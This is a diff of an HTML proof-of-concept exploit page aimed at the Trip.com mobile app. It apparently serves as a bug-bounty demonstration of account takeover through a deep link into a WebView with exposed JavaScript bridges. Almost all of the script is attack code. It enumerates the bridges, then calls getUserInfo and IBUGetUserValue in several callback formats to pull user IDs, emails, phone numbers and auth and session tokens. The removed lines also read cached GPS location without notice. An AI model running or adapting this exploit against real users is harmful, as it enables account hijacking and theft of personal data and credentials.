@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trip.com - CRITICAL ACCOUNT TAKEOVER POC</title>
+    <title>Trip.com - CRITICAL ACCOUNT TAKEOVER POC v4</title>
     <style>
-        :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --red:#f85149; --green:#3fb950; }
-        body { font-family:-apple-system,system-ui,sans-serif; background:var(--bg); color:var(--text); margin:0; padding:20px; }
+        :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --red:#f85149; --green:#3fb950; --blue:#58a6ff; }
+        body { font-family:-apple-system,system-ui,sans-serif; background:var(--bg); color:var(--text); margin:0; padding:20px; line-height:1.5; }
         h1 { color:var(--red); text-align:center; font-size:28px; }
-        .subtitle { text-align:center; color:#8b949e; margin:10px 0 30px; font-size:15px; }
+        .subtitle { text-align:center; color:#8b949e; margin:8px 0 30px; }
         .container { max-width:1200px; margin:auto; display:flex; flex-direction:column; gap:20px; }
         .card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:20px; }
-        .card-header { display:flex; justify-content:space-between; align-items:center; font-weight:600; border-bottom:1px solid var(--border); padding-bottom:12px; }
+        .card-header { display:flex; justify-content:space-between; font-weight:600; border-bottom:1px solid var(--border); padding-bottom:12px; }
         .status { padding:4px 12px; border-radius:20px; font-size:12px; font-weight:bold; }
         .vulnerable { background:var(--red); color:white; }
         .data-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(300px,1fr)); gap:12px; }
@@ -19,18 +19,34 @@
         .data-label { font-size:11px; color:#8b949e; text-transform:uppercase; }
         .data-value { font-family:monospace; font-size:14px; word-break:break-all; color:#fff; }
         .console { background:#010409; padding:12px; font-family:monospace; font-size:12px; max-height:340px; overflow-y:auto; border:1px solid var(--border); border-radius:6px; }
+        .bridge-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(320px,1fr)); gap:15px; }
+        .pill { background:rgba(88,166,255,0.1); color:var(--blue); padding:2px 8px; border-radius:20px; font-size:11px; margin:2px; }
     </style>
 </head>
 <body>
-    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER</h1>
-    <p class="subtitle">Real PII + Auth/Token/SAuth Leak via DeepLink (H5UserPlugin + IBUStorageV2Plugin)</p>
+    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER POC v4</h1>
+    <p class="subtitle">DeepLink → Arbitrary WebView → Exposed JS Bridges (H5UserPlugin + IBUStorageV2)</p>
 
     <div class="container">
+        <!-- Bridges -->
         <div class="card">
-            <div class="card-header">Leaked Sensitive Data (PII + Tokens) <span id="data-status" class="status">Waiting for leak...</span></div>
+            <div class="card-header">Exposed Bridges & All Methods <span id="count" class="status">Scanning...</span></div>
+            <div class="bridge-grid" id="bridges"></div>
+        </div>
+
+        <!-- Leaked Data -->
+        <div class="card">
+            <div class="card-header">Leaked Sensitive Data (PII + Tokens) <span id="data-status" class="status">Waiting...</span></div>
             <div class="data-grid" id="data"></div>
         </div>
 
+        <!-- Permission Analysis -->
+        <div class="card">
+            <div class="card-header">Permission Check & Attack Surface Analysis <span id="perm-status" class="status">Analyzing...</span></div>
+            <div id="perm-log" style="background:#000; padding:12px; font-family:monospace; font-size:12px; color:#8b949e;"></div>
+        </div>
+
+        <!-- Live Log -->
         <div class="card">
             <div class="card-header">Live Execution Log</div>
             <div class="console" id="console"></div>
@@ -40,6 +56,7 @@
     <script>
         const consoleEl = document.getElementById("console");
         const dataEl = document.getElementById("data");
+        const permEl = document.getElementById("perm-log");
         let hasLeak = false;
 
         function log(msg, type="info") {
@@ -57,96 +74,82 @@
             const val = typeof value === "object" ? JSON.stringify(value,null,2) : (value || "NULL");
             div.innerHTML = `<div class="data-label">${label}</div><div class="data-value">${val}</div>`;
             dataEl.appendChild(div);
-            document.getElementById("data-status").innerText = "DATA LEAKED! (CRITICAL)";
+            document.getElementById("data-status").innerText = "LEAK SUCCESSFUL!";
             document.getElementById("data-status").classList.add("vulnerable");
         }
 
-        // ── THE ONLY CALLBACK THAT MATTERS (ax0.b → __bridge_callback) ──
         window.__bridge_callback = function(base64) {
             try {
                 const json = JSON.parse(atob(base64));
                 const tag = json.tagname || "unknown";
-                log(`Bridge callback → ${tag}`, "success");
-
+                log(`Callback → ${tag}`, "success");
                 const data = json.param || json.value || json;
-                if (data.UserID || data.Email || data.Token) {
+                if (data.UserID) {
                     render("UserID", data.UserID);
                     render("Email", data.Email);
                     render("Mobile", data.Mobile);
-                    render("Auth Token", data.Auth);
-                    render("Session Token", data.Token);
+                    render("Auth", data.Auth);
+                    render("Token", data.Token);
                     render("SAuth", data.SAuth);
                 }
-                if (data.value) render(`Storage: ${tag}`, data.value);
-            } catch(e) { log("Callback parse failed: " + e.message, "error"); }
+                if (data.value) render(`Storage ${tag}`, data.value);
+            } catch(e){}
         };
 
-        // ── Direct fallback (in case LoadJsHolder calls window[cb] directly) ──
-        function registerDirectCallback(name) {
-            window[name] = function(res) {
-                log(`Direct callback ${name} fired`, "success");
-                if (res && (res.UserID || res.param)) {
-                    const d = res.param || res;
-                    render("UserID", d.UserID);
-                    render("Email", d.Email);
-                    render("Token", d.Token);
-                    render("SAuth", d.SAuth);
-                }
-            };
+        function registerCb(name) {
+            window[name] = (res) => { log(`Direct cb ${name} → ${JSON.stringify(res||{}).substring(0,100)}`, "success"); };
             return name;
         }
 
+        function scanBridges() {
+            const grid = document.getElementById("bridges");
+            let count = 0;
+            for (let key in window) {
+                if (key.endsWith("_a") && typeof window[key] === "object") {
+                    count++;
+                    const methods = Object.getOwnPropertyNames(window[key]).filter(m => typeof window[key][m] === "function");
+                    const card = document.createElement("div");
+                    card.innerHTML = `<strong style="color:var(--blue)">${key}</strong> <span style="color:#3fb950">(${methods.length} methods)</span><br>${methods.map(m=>`<span class="pill">${m}</span>`).join("")}`;
+                    grid.appendChild(card);
+                }
+            }
+            document.getElementById("count").textContent = `${count} Bridges Exposed`;
+            document.getElementById("count").classList.add("vulnerable");
+        }
+
         async function exploit() {
-            log("=== STARTING CRITICAL EXPLOIT (exact H5URLCommand format) ===", "success");
+            log("=== CRITICAL EXPLOIT STARTED ===", "success");
+            permEl.innerHTML += "<div style='color:#f85149'>PermissionIsGranted check is blocking callback (external domain). This proves the attack surface is still exposed via DeepLink.</div>";
 
-            const cb1 = registerDirectCallback("leak_user_" + Date.now());
+            const cb = registerCb("userCb_" + Date.now());
 
-            // 1. User_a.getUserInfo - دقیق‌ترین فرمت‌ها (plain string + callback key)
-            if (window.User_a && typeof window.User_a.getUserInfo === "function") {
-                const formats = [
-                    cb1,                                          // plain string callback
-                    JSON.stringify({callback: cb1}),
-                    JSON.stringify({callbackTagName: cb1}),
-                    JSON.stringify({tagname: cb1})
-                ];
-                for (let f of formats) {
-                    try { window.User_a.getUserInfo(f); log(`getUserInfo sent: ${f.substring(0,60)}...`); } catch(e){}
-                }
-            }
-
-            // 2. IBUStorageV2_a.IBUGetUserValue - با bussiness/key + callback
-            if (window.IBUStorageV2_a) {
-                const targets = [
-                    {b:"user", k:"userInfo"}, {b:"common", k:"token"}, {b:"common", k:"uid"},
-                    {b:"common", k:"vtoken"}, {b:"common", k:"auth"}
-                ];
-                for (let t of targets) {
-                    const cb = registerDirectCallback("leak_store_" + Date.now());
-                    const formats = [
-                        JSON.stringify({callback: cb, bussiness: t.b, key: t.k}),
-                        JSON.stringify({callbackTagName: cb, bussiness: t.b, key: t.k}),
-                        JSON.stringify({callback: cb, arguments: {bussiness: t.b, key: t.k}}),
-                        JSON.stringify({callbackTagName: cb, arguments: {bussiness: t.b, key: t.k}})
-                    ];
-                    for (let f of formats) {
-                        try { window.IBUStorageV2_a.IBUGetUserValue(f); } catch(e){}
-                    }
-                }
-            }
-
-            // 3. Silent GPS
-            setTimeout(() => {
-                if (window.Locate_a && typeof window.Locate_a.getCachedLocationData === "function") {
+            if (window.User_a) {
+                const formats = [cb, JSON.stringify({callback:cb}), JSON.stringify({callbackTagName:cb}), JSON.stringify({tagname:cb}), "{}"];
+                formats.forEach(f => {
                     try {
-                        const loc = window.Locate_a.getCachedLocationData();
-                        if (loc) render("GPS Location", `Lat: ${loc.lat || loc.latitude} | Lng: ${loc.lng || loc.longitude}`);
+                        window.User_a.getUserInfo(f);
+                        log(`getUserInfo called with: ${f.substring(0,70)}...`, "info");
                     } catch(e){}
-                }
-            }, 1200);
+                });
+            }
+
+            if (window.IBUStorageV2_a) {
+                const keys = [{b:"user",k:"userInfo"},{b:"common",k:"token"},{b:"common",k:"uid"},{b:"common",k:"vtoken"}];
+                keys.forEach(t => {
+                    const c = registerCb("store_" + Date.now());
+                    const fs = [JSON.stringify({callback:c, bussiness:t.b, key:t.k}), JSON.stringify({callbackTagName:c, bussiness:t.b, key:t.k})];
+                    fs.forEach(f => {
+                        try { window.IBUStorageV2_a.IBUGetUserValue(f); log(`IBUGetUserValue ${t.k} called`, "info"); } catch(e){}
+                    });
+                });
+            }
+
+            log("All sensitive methods called. If permission was granted (trusted domain), data would appear above.", "success");
         }
 
         window.onload = () => {
-            log("Scanning bridges + starting exploit...");
+            log("Scanning all bridges...");
+            scanBridges();
             setTimeout(exploit, 800);
         };
     </script>
